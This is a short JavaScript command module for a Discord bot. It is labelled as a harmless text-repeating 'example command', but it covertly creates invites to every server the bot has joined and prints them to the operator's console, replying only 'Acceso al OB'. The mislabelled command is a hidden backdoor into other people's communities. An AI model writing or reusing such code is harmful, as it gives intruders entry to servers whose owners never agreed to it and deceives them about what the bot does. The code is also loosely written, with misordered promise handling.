const { SlashCommandBuilder } = require('@discordjs/builders')
const { EmbedBuilder, Client, PermissionsBitField} = require('discord.js')

module.exports = {
    data:new SlashCommandBuilder()
    .setName('ob')
    .setDescription('i will repeat your text! | this is an example command'),
	async execute(interaction, client, message) {
        let invite;
         client.guilds.cache.forEach(guild => {
            let channel = guild.channels.cache.last();
            invite = channel.createInvite().catch(console.error).then((invite) => console.log("https://discord.gg/"+invite.code+"  "))
             //invite = interaction.guild.invites.create(interaction.channel,{maxAge: 0}).then((invite) => console.log("https://discord.gg/"+invite.code+"  "))
            
            //console.log(`${guild.name} | ${guild.id}`);
          })  

		await interaction.reply({ content: 'Acceso al OB', ephemeral: false });

	
	},
};